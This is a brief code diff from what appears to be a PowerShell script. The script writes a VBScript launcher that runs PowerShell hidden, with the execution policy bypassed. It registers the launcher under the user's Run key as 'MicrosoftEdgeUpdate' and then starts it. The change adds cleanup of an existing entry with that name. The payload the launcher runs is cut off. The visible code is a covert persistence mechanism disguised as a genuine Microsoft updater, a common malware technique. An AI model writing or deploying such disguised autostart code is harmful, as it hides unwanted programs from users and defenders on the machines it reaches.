@@ -15,6 +15,9 @@ objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolic
 "@ | Set-Content $vbsPath
 
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
+    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
+}
 Set-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -Value "wscript.exe `"$vbsPath`""
 
 Start-Process wscript.exe -ArgumentList "`"$vbsPath`""
